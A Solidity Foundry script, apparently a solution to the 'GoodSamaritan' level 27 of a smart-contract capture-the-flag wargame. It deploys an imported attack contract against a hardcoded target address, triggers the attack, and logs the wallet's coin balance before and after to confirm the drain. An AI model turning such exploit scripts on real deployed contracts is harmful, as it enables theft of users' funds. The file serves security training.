// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {GoodSamaritan, Coin, Wallet} from "../src/level27/GoodSamaritan.sol";
import {AttackGoodSamaritan} from "../src/level27/AttackGoodSamaritan.sol";

import "forge-std/console.sol";

contract level27Exploit is Script {
    GoodSamaritan goodSamaritan =
        GoodSamaritan(0x615a4d8fB93b3d5BcbE8f4497141fF9986A9E0C8);

    function run() external {
        vm.startBroadcast();
        AttackGoodSamaritan attackGoodSamaritan = new AttackGoodSamaritan(
            address(goodSamaritan)
        );
        console.log(
            "Samaritan balance: ",
            goodSamaritan.coin().balances(address(goodSamaritan.wallet()))
        );
        attackGoodSamaritan.attack();
        console.log(
            "Samaritan balance: ",
            goodSamaritan.coin().balances(address(goodSamaritan.wallet()))
        );
        vm.stopBroadcast();
    }
}
